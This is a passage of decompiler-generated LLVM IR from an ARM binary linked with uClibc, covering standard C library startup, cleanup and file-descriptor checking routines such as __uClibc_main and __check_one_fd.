dec_label_pc_285f8:                               ; preds = %dec_label_pc_285e4
  %v0_285f8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_285f8, i32* @r3, align 4
  br label %dec_label_pc_285fc

dec_label_pc_285fc:                               ; preds = %dec_label_pc_285cc, %dec_label_pc_285e4.dec_label_pc_285d8_crit_edge, %dec_label_pc_285f8
  %v1_28600 = phi i32 [ %v0_285f8, %dec_label_pc_285f8 ], [ %v2_285d835, %dec_label_pc_285cc ], [ %v2_285d8, %dec_label_pc_285e4.dec_label_pc_285d8_crit_edge ]
  %v1_285fc = load i32, i32* %r6.global-to-local, align 4
  %v3_285fc = icmp uge i32 %v1_28600, %v1_285fc
  store i1 %v3_285fc, i1* %cpsr_c.global-to-local, align 1
  %v9_285fc = icmp eq i32 %v1_28600, %v1_285fc
  br i1 %v9_285fc, label %dec_label_pc_28608, label %bb

bb:                                               ; preds = %dec_label_pc_285fc
  store i32 %v1_28600, i32* %r6.global-to-local, align 4
  %v1_285c0 = or i32 %v1_28600, 2
  store i32 %v1_285c0, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_285c4 = icmp eq i32 %v1_285c0, %v1_28600
  br i1 %v9_285c4, label %dec_label_pc_28670, label %bb.dec_label_pc_285cc_crit_edge

bb.dec_label_pc_285cc_crit_edge:                  ; preds = %bb
  %v0_285d0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_285cc

dec_label_pc_28608:                               ; preds = %dec_label_pc_285fc
  %v0_28608 = load i32, i32* %r5.global-to-local, align 4
  %v1_28608 = and i32 %v0_28608, -69
  store i32 %v1_28608, i32* @r3, align 4
  %v2_2860c = icmp ugt i32 %v1_28608, 9
  store i1 %v2_2860c, i1* %cpsr_c.global-to-local, align 1
  %v7_2860c = icmp eq i32 %v1_28608, 10
  br i1 %v7_2860c, label %dec_label_pc_28614, label %dec_label_pc_28670

dec_label_pc_28614:                               ; preds = %dec_label_pc_28608
  %v1_28618 = load i32, i32* %r7.global-to-local, align 4
  %v2_28618 = add i32 %v1_28618, 544
  %v3_28618 = inttoptr i32 %v2_28618 to i32*
  store i32 -1, i32* %v3_28618, align 4
  %v0_2861c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_2861c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_28620

dec_label_pc_28620:                               ; preds = %dec_label_pc_28654.dec_label_pc_28620_crit_edge, %dec_label_pc_28614
  %v0_28624 = phi i32 [ %v0_28624.pre, %dec_label_pc_28654.dec_label_pc_28620_crit_edge ], [ %v0_2861c, %dec_label_pc_28614 ]
  %v0_28620 = load i32, i32* %r7.global-to-local, align 4
  %v1_28620 = add i32 %v0_28620, 132
  %v2_28620 = inttoptr i32 %v1_28620 to i32*
  %v3_28620 = load i32, i32* %v2_28620, align 4
  store i32 %v0_28624, i32* %r2.global-to-local, align 4
  store i32 %v3_28620, i32* %r4.global-to-local, align 4
  %v1_2863022 = inttoptr i32 %v0_28624 to i32*
  %v2_2863023 = load i32, i32* %v1_2863022, align 4
  %v3_2863425 = icmp uge i32 %v2_2863023, %v3_28620
  store i1 %v3_2863425, i1* %cpsr_c.global-to-local, align 1
  %v9_2863431 = icmp eq i32 %v2_2863023, %v3_28620
  br i1 %v9_2863431, label %dec_label_pc_2863c, label %dec_label_pc_28654

dec_label_pc_2863c:                               ; preds = %dec_label_pc_28620, %dec_label_pc_2863c.dec_label_pc_28630_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_2864c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2864c, label %dec_label_pc_28650, label %dec_label_pc_2863c.dec_label_pc_28630_crit_edge

dec_label_pc_2863c.dec_label_pc_28630_crit_edge:  ; preds = %dec_label_pc_2863c
  %v0_28630.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_28634.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_28630 = inttoptr i32 %v0_28630.pre to i32*
  %v2_28630 = load i32, i32* %v1_28630, align 4
  %v3_28634 = icmp uge i32 %v2_28630, %v1_28634.pre
  store i1 %v3_28634, i1* %cpsr_c.global-to-local, align 1
  %v9_28634 = icmp eq i32 %v2_28630, %v1_28634.pre
  br i1 %v9_28634, label %dec_label_pc_2863c, label %dec_label_pc_28654

dec_label_pc_28650:                               ; preds = %dec_label_pc_2863c
  %v0_28650 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_28654

dec_label_pc_28654:                               ; preds = %dec_label_pc_28620, %dec_label_pc_2863c.dec_label_pc_28630_crit_edge, %dec_label_pc_28650
  %v0_28654 = phi i32 [ %v0_28650, %dec_label_pc_28650 ], [ %v2_2863023, %dec_label_pc_28620 ], [ %v2_28630, %dec_label_pc_2863c.dec_label_pc_28630_crit_edge ]
  %v1_28654 = phi i32 [ %v0_28650, %dec_label_pc_28650 ], [ %v3_28620, %dec_label_pc_28620 ], [ %v1_28634.pre, %dec_label_pc_2863c.dec_label_pc_28630_crit_edge ]
  %v3_28654 = icmp uge i32 %v0_28654, %v1_28654
  store i1 %v3_28654, i1* %cpsr_c.global-to-local, align 1
  %v9_28654 = icmp eq i32 %v0_28654, %v1_28654
  br i1 %v9_28654, label %dec_label_pc_2865c, label %dec_label_pc_28654.dec_label_pc_28620_crit_edge

dec_label_pc_28654.dec_label_pc_28620_crit_edge:  ; preds = %dec_label_pc_28654
  %v0_28624.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_28620

dec_label_pc_2865c:                               ; preds = %dec_label_pc_28654
  store i32 128, i32* @r3, align 4
  %v0_28664 = load i32, i32* %r8.global-to-local, align 4
  %v2_28664 = add i32 %v0_28664, 128
  %v3_28664 = inttoptr i32 %v2_28664 to i32*
  %v4_28664 = load i32, i32* %v3_28664, align 4
  store i32 %v4_28664, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_28664)
  %v0_28670.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_28670

dec_label_pc_28670:                               ; preds = %entry, %bb, %dec_label_pc_28608, %dec_label_pc_2865c
  %v0_28670 = phi i32 [ %v1_28600, %dec_label_pc_28608 ], [ %v0_28670.pre, %dec_label_pc_2865c ], [ %v3_285b4, %entry ], [ %v1_28600, %bb ]
  %v2_28674 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_28674, i32* @r4, align 4
  ret i32 %v0_28670

; uselistorder directives
  uselistorder i32 %v0_28650, { 1, 0 }
  uselistorder i32 %v1_28634.pre, { 0, 2, 1 }
  uselistorder i32 %v1_285fc, { 1, 0 }
  uselistorder i32 %v1_28600, { 0, 1, 4, 3, 5, 6, 7, 2 }
  uselistorder i32 %v1_285dc.pre, { 1, 0 }
  uselistorder i32 %v0_285d450, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 5, 4, 0, 6, 10, 7, 9, 8, 1, 2 }
  uselistorder i32 -1036, { 1, 2, 0 }
  uselistorder label %dec_label_pc_28670, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_28654, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2863c, { 1, 0 }
  uselistorder label %dec_label_pc_285fc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_285e4, { 1, 0 }
  uselistorder label %dec_label_pc_285cc, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_28694 = add i32 %tmp, 4
  %v4_28694 = inttoptr i32 %v3_28694 to i32*
  store i32 %arg3, i32* %v4_28694, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_286a0 = icmp eq i32 %arg2, 0
  br i1 %v2_286a0, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_286ac = add i32 %tmp, 4
  %v3_286ac = inttoptr i32 %v2_286ac to i32*
  %v4_286ac = load i32, i32* %v3_286ac, align 4
  store i32 %v4_286ac, i32* %r0.global-to-local, align 4
  %v3_286b0 = load i32, i32* %arg1, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %.02 = phi i32 [ %v3_286b0, %bb ], [ undef, %entry ]
  %v2_286b8 = xor i1 %v2_286a0, true
  call void @__pseudo_cond_branch(i1 %v2_286b8, i32 %.02)
  %v1_286c4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_286c4

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_286ec.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_286c8 = load i32, i32* @r4, align 4
  store i32 %v3_286c8, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -28), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_286ec

dec_label_pc_286ec:                               ; preds = %dec_label_pc_286ec.dec_label_pc_286ec_crit_edge, %dec_label_pc_286ec.lr.ph
  %v1_286ec = phi i32 [ %v1_286f8, %dec_label_pc_286ec.dec_label_pc_286ec_crit_edge ], [ 0, %dec_label_pc_286ec.lr.ph ]
  %v0_286ec = phi i32 [ %v0_286ec.pre, %dec_label_pc_286ec.dec_label_pc_286ec_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -28), %dec_label_pc_286ec.lr.ph ]
  %v4_286ec = mul i32 %v1_286ec, 4
  %v5_286ec = add i32 %v4_286ec, %v0_286ec
  %v6_286ec = inttoptr i32 %v5_286ec to i32*
  %v7_286ec = load i32, i32* %v6_286ec, align 4
  call void @__pseudo_branch(i32 %v7_286ec)
  %v0_286f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_286f8 = add i32 %v0_286f8, -1
  store i32 %v1_286f8, i32* %r4.global-to-local, align 4
  %v2_286f8 = icmp eq i32 %v0_286f8, 0
  br i1 %v2_286f8, label %dec_label_pc_28700, label %dec_label_pc_286ec.dec_label_pc_286ec_crit_edge

dec_label_pc_286ec.dec_label_pc_286ec_crit_edge:  ; preds = %dec_label_pc_286ec
  %v0_286ec.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_286ec

dec_label_pc_28700:                               ; preds = %dec_label_pc_286ec
  %v0_28704.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_28704 = add i32 %v0_28704.pre, 27416
  %v3_28704 = inttoptr i32 %v2_28704 to i32*
  %v4_28704 = load i32, i32* %v3_28704, align 4
  %v2_28708 = icmp eq i32 %v4_28704, 0
  br i1 %v2_28708, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_28700
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_28700, %bb
  %v2_28710 = xor i1 %v2_28708, true
  call void @__pseudo_cond_branch(i1 %v2_28710, i32 %v4_28704)
  %v0_28718 = load i32, i32* %r5.global-to-local, align 4
  %v2_28718 = add i32 %v0_28718, 27420
  %v3_28718 = inttoptr i32 %v2_28718 to i32*
  %v4_28718 = load i32, i32* %v3_28718, align 4
  %v2_2871c = icmp eq i32 %v4_28718, 0
  br i1 %v2_2871c, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_28724 = xor i1 %v2_2871c, true
  call void @__pseudo_cond_branch(i1 %v2_28724, i32 %v4_28718)
  %v2_28728 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_28728, i32* %r4.global-to-local, align 4
  %v1_2872c = load i32, i32* @r0, align 4
  ret i32 %v1_2872c

; uselistorder directives
  uselistorder i32 %v1_286f8, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_28744 = load i32, i32* @r4, align 4
  %v6_28744 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_28758 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_28760 = icmp eq i32 %v2_28758, -1
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r3, align 4
  br i1 %v3_28760, label %dec_label_pc_2876c, label %dec_label_pc_28784

dec_label_pc_2876c:                               ; preds = %entry
  %v0_28770 = load i32, i32* @r5, align 4
  %v2_28778 = call i32 @__libc_open(i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -34200), i32 %v0_28770)
  %v1_2877c = load i32, i32* @r4, align 4
  %v1_28780 = icmp ne i32 %v2_28778, %v1_2877c
  call void @__pseudo_cond_branch(i1 %v1_28780, i32 ptrtoint (i32* @global_var_26764.3322 to i32))
  br label %dec_label_pc_28784

dec_label_pc_28784:                               ; preds = %entry, %dec_label_pc_2876c
  %v1_2878c = phi i32 [ %v2_28758, %entry ], [ %v2_28778, %dec_label_pc_2876c ]
  store i32 %v3_28744, i32* @r4, align 4
  store i32 %v6_28744, i32* @r5, align 4
  ret i32 %v1_2878c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_28784, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_28798 = load i32, i32* @r4, align 4
  store i32 %v3_28798, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r4.global-to-local, align 4
  %v4_287a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 164) to i32*), align 4
  %v1_287ac = inttoptr i32 %v4_287a8 to i32*
  %v2_287ac = load i32, i32* %v1_287ac, align 4
  %v2_287b0 = icmp eq i32 %v2_287ac, 0
  br i1 %v2_287b0, label %dec_label_pc_287b8, label %dec_label_pc_287dc

dec_label_pc_287b8:                               ; preds = %entry
  store i32 4096, i32* %v1_287ac, align 4
  %v0_287c0 = call i32 @__pthread_initialize_minimal()
  %v0_287c8 = load i32, i32* %r4.global-to-local, align 4
  %v2_287c8 = add i32 %v0_287c8, -128024
  %v2_287d0 = icmp eq i32 %v2_287c8, 0
  br i1 %v2_287d0, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_287b8
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_287b8, %bb
  %v2_287d8 = xor i1 %v2_287d0, true
  call void @__pseudo_cond_branch(i1 %v2_287d8, i32 %v2_287c8)
  %v2_287dc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_287dc

dec_label_pc_287dc:                               ; preds = %entry, %bb4
  %v2_287dc = phi i32 [ %v2_287dc.pre, %bb4 ], [ %v3_28798, %entry ]
  %.0 = phi i32 [ %v0_287c0, %bb4 ], [ undef, %entry ]
  store i32 %v2_287dc, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_287dc, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp62 = call i32 @__decompiler_undefined_function_0()
  %tmp63 = call i32 @__decompiler_undefined_function_0()
  %tmp64 = call i32 @__decompiler_undefined_function_0()
  %tmp65 = call i32 @__decompiler_undefined_function_0()
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-416 = alloca i32, align 4
  store i32 106688, i32* %r4.global-to-local, align 4
  %v1_287fc = add i32 %tmp, 4
  store i32 %v1_287fc, i32* %ip.global-to-local, align 4
  %v2_28800 = load i32, i32* %arg3, align 4
  store i32 28, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r4.global-to-local, align 4
  %v3_2880c = mul i32 %arg2, 4
  store i32 %v3_2880c, i32* @r7, align 4
  %v4_28814 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 28) to i32*), align 4
  store i32 %v4_28814, i32* %r1.global-to-local, align 4
  store i32 64, i32* %r2.global-to-local, align 4
  %v2_2881c = add i32 %v1_287fc, %v3_2880c
  store i32 %v2_2881c, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %stack_var_-416, align 4
  %v4_28824 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 64) to i32*), align 4
  store i32 %v4_28824, i32* %r4.global-to-local, align 4
  %v3_28828 = icmp uge i32 %v2_2881c, %v2_28800
  store i1 %v3_28828, i1* %cpsr_c.global-to-local, align 1
  %v9_28828 = icmp eq i32 %v2_2881c, %v2_28800
  store i1 %v9_28828, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg7, i32* %r2.global-to-local, align 4
  %v2_28830 = inttoptr i32 %v4_28824 to i32*
  store i32 %v2_2881c, i32* %v2_28830, align 4
  br i1 %v9_28828, label %bb, label %bb75

bb:                                               ; preds = %entry
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br label %bb75

bb75:                                             ; preds = %entry, %bb
  %v0_28838 = load i32, i32* %r2.global-to-local, align 4
  %v1_28838 = load i32, i32* %r1.global-to-local, align 4
  %v2_28838 = inttoptr i32 %v1_28838 to i32*
  store i32 %v0_28838, i32* %v2_28838, align 4
  %v2_2883c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_2883c, i32* %r5.global-to-local, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 27420, i32* %r2.global-to-local, align 4
  %v0_28848 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_28848, i32* @r6, align 4
  br i1 %v9_28828, label %bb76, label %.thread52

.thread52:                                        ; preds = %bb75
  %v3_2885053 = add i32 %v2_2883c, 27420
  %v4_2885054 = inttoptr i32 %v3_2885053 to i32*
  store i32 %arg6, i32* %v4_2885054, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %bb75
  %v1_2884c = load i32, i32* %ip.global-to-local, align 4
  %v2_2884c = load i32, i32* @r7, align 4
  %v3_2884c = add i32 %v2_2884c, %v1_2884c
  store i32 %v3_2884c, i32* %r3.global-to-local, align 4
  %v3_2885050 = add i32 %v2_2883c, 27420
  %v4_2885051 = inttoptr i32 %v3_2885050 to i32*
  store i32 %arg6, i32* %v4_2885051, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_2885c = load i32, i32* %r3.global-to-local, align 4
  %v2_2885c = load i32, i32* %r4.global-to-local, align 4
  %v3_2885c = inttoptr i32 %v2_2885c to i32*
  store i32 %v1_2885c, i32* %v3_2885c, align 4
  br label %bb77

bb77:                                             ; preds = %.thread52, %bb76
  %v2_28860 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_28860, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r2.global-to-local, align 4
  %v3_28868 = bitcast i32* %stack_var_-120 to i8*
  %v4_28868 = call i32 @__GI_memset(i8* %v3_28868, i32 0, i32 120)
  store i32 %v4_28868, i32* %r0.global-to-local, align 4
  %v0_2886c = load i32, i32* %r4.global-to-local, align 4
  %v1_2886c = inttoptr i32 %v0_2886c to i32*
  %v2_2886c = load i32, i32* %v1_2886c, align 4
  br label %dec_label_pc_28878

dec_label_pc_28878:                               ; preds = %dec_label_pc_28878, %bb77
  %storemerge = phi i32 [ %v2_2886c, %bb77 ], [ %v1_28884, %dec_label_pc_28878 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_28878 = inttoptr i32 %storemerge to i32*
  %v2_28878 = load i32, i32* %v1_28878, align 4
  store i32 %v2_28878, i32* %r3.global-to-local, align 4
  %v2_2887c = icmp eq i32 %v2_28878, 0
  %v1_28884 = add i32 %storemerge, 4
  br i1 %v2_2887c, label %dec_label_pc_28884, label %dec_label_pc_28878

dec_label_pc_28884:                               ; preds = %dec_label_pc_28878
  store i32 %v1_28884, i32* @r4, align 4
  store i32 %v2_28860, i32* @r5, align 4
  %v1_288a830 = inttoptr i32 %v1_28884 to i32*
  %v2_288a831 = load i32, i32* %v1_288a830, align 4
  store i32 %v2_288a831, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_288ac33 = icmp eq i32 %v2_288a831, 0
  store i1 %v2_288ac33, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_288ac33, label %dec_label_pc_288b4, label %dec_label_pc_28890

dec_label_pc_28890:                               ; preds = %dec_label_pc_28884, %dec_label_pc_288a8
  %v4_28898 = phi i32 [ %v1_288a4, %dec_label_pc_288a8 ], [ %v1_28884, %dec_label_pc_28884 ]
  %v5_28894 = phi i32 [ %v2_288a8, %dec_label_pc_288a8 ], [ %v2_288a831, %dec_label_pc_28884 ]
  %v2_28890 = icmp ugt i32 %v5_28894, 13
  store i1 %v2_28890, i1* %cpsr_c.global-to-local, align 1
  %v7_28890 = icmp eq i32 %v5_28894, 14
  store i1 %v7_28890, i1* %cpsr_z.global-to-local, align 1
  %v2_28894 = xor i1 %v2_28890, true
  %v3_28894 = or i1 %v7_28890, %v2_28894
  br i1 %v3_28894, label %bb78, label %bb79

bb78:                                             ; preds = %dec_label_pc_28890
  %v4_28894 = load i32, i32* @r5, align 4
  %v6_28894 = and i32 %v5_28894, 536870912
  %v7_28894 = icmp ne i32 %v6_28894, 0
  store i1 %v7_28894, i1* %cpsr_c.global-to-local, align 1
  %v8_28894 = mul i32 %v5_28894, 8
  %v9_28894 = add i32 %v4_28894, %v8_28894
  store i32 %v9_28894, i32* %r0.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_28890, %bb78
  %v1_288a0 = phi i1 [ %v2_28890, %dec_label_pc_28890 ], [ %v7_28894, %bb78 ]
  %v2_28898 = xor i1 %v1_288a0, true
  %v3_28898 = or i1 %v7_28890, %v2_28898
  br i1 %v3_28898, label %bb80, label %dec_label_pc_288a8

bb80:                                             ; preds = %bb79
  store i32 %v4_28898, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_288a8

dec_label_pc_288a8:                               ; preds = %bb79, %bb80
  call void @__pseudo_cond_branch(i1 %v3_28898, i32 ptrtoint (i32* @global_var_24950.3330 to i32))
  %v0_288a4 = load i32, i32* @r4, align 4
  %v1_288a4 = add i32 %v0_288a4, 8
  store i32 %v1_288a4, i32* @r4, align 4
  %v1_288a8 = inttoptr i32 %v1_288a4 to i32*
  %v2_288a8 = load i32, i32* %v1_288a8, align 4
  store i32 %v2_288a8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_288ac = icmp eq i32 %v2_288a8, 0
  store i1 %v2_288ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_288ac, label %dec_label_pc_288b4, label %dec_label_pc_28890

dec_label_pc_288b4:                               ; preds = %dec_label_pc_288a8, %dec_label_pc_28884
  store i32 %v2_28860, i32* %r0.global-to-local, align 4
  %v1_288b8 = call i32 @_dl_aux_init(i32 %v2_28860)
  store i32 %v1_288b8, i32* %r0.global-to-local, align 4
  %v1_288bc = call i32 @__GI___uClibc_init(i32 %v1_288b8)
  store i32 %v1_288bc, i32* @r0, align 4
  store i32 164, i32* %r3.global-to-local, align 4
  %v2_288c4 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_288c4, i32* @lr, align 4
  store i32 %tmp66, i32* @r2, align 4
  %v2_288cc = add i32 %v2_288c4, 164
  %v3_288cc = inttoptr i32 %v2_288cc to i32*
  %v4_288cc = load i32, i32* %v3_288cc, align 4
  store i32 %v4_288cc, i32* %r1.global-to-local, align 4
  store i32 %tmp65, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_288d4 = icmp eq i32 %tmp66, 0
  store i1 %v2_288d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_288d4, label %bb81, label %bb82

bb81:                                             ; preds = %dec_label_pc_288b4
  store i32 4096, i32* @r2, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_288b4, %bb81
  %v0_288e0 = phi i32 [ %tmp66, %dec_label_pc_288b4 ], [ 4096, %bb81 ]
  %v3_288dc = icmp eq i32 %tmp65, -1
  store i1 %v3_288dc, i1* %cpsr_c.global-to-local, align 1
  %v8_288dc = icmp eq i32 %tmp65, -1
  store i1 %v8_288dc, i1* %cpsr_z.global-to-local, align 1
  %v2_288e0 = inttoptr i32 %v4_288cc to i32*
  store i32 %v0_288e0, i32* %v2_288e0, align 4
  br i1 %v3_288dc, label %dec_label_pc_288e8, label %dec_label_pc_28910

dec_label_pc_288e8:                               ; preds = %bb82
  %v0_288e8 = call i32 @getuid()
  store i32 %v0_288e8, i32* @r0, align 4
  store i32 %v0_288e8, i32* %r4.global-to-local, align 4
  %v0_288f0 = call i32 @geteuid()
  store i32 %v0_288f0, i32* @r0, align 4
  %v3_288f4 = icmp uge i32 %v0_288e8, %v0_288f0
  store i1 %v3_288f4, i1* %cpsr_c.global-to-local, align 1
  %v9_288f4 = icmp eq i32 %v0_288e8, %v0_288f0
  store i1 %v9_288f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_288f4, label %dec_label_pc_288fc, label %dec_label_pc_28938

dec_label_pc_288fc:                               ; preds = %dec_label_pc_288e8
  %v1_288fc = call i32 @getgid(i32 %v0_288f0)
  store i32 %v1_288fc, i32* @r0, align 4
  store i32 %v1_288fc, i32* %r4.global-to-local, align 4
  %v0_28904 = call i32 @getegid()
  store i32 %v0_28904, i32* %r0.global-to-local, align 4
  %v3_28908 = icmp uge i32 %v1_288fc, %v0_28904
  store i1 %v3_28908, i1* %cpsr_c.global-to-local, align 1
  %v9_28908 = icmp eq i32 %v1_288fc, %v0_28904
  store i1 %v9_28908, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_28908, label %dec_label_pc_28910, label %dec_label_pc_28938

dec_label_pc_28910:                               ; preds = %dec_label_pc_288fc, %bb82
  store i32 %tmp65, i32* @r2, align 4
  store i1 %v3_288dc, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_288dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_288dc, label %dec_label_pc_28960, label %dec_label_pc_2891c

dec_label_pc_2891c:                               ; preds = %dec_label_pc_28910
  store i32 %tmp64, i32* @r3, align 4
  %v3_28920 = icmp uge i32 %tmp65, %tmp64
  store i1 %v3_28920, i1* %cpsr_c.global-to-local, align 1
  %v9_28920 = icmp eq i32 %tmp65, %tmp64
  store i1 %v9_28920, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_28920, label %dec_label_pc_28928, label %dec_label_pc_28938

dec_label_pc_28928:                               ; preds = %dec_label_pc_2891c
  store i32 %tmp63, i32* @r2, align 4
  store i32 %tmp62, i32* @r3, align 4
  %v3_28930 = icmp uge i32 %tmp63, %tmp62
  store i1 %v3_28930, i1* %cpsr_c.global-to-local, align 1
  %v9_28930 = icmp eq i32 %tmp63, %tmp62
  store i1 %v9_28930, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_28930, label %dec_label_pc_28960, label %dec_label_pc_28938

dec_label_pc_28938:                               ; preds = %dec_label_pc_2891c, %dec_label_pc_288fc, %dec_label_pc_288e8, %dec_label_pc_28928
  store i32 32770, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_28944 = call i32 @__check_one_fd(i32 0, i32 32768)
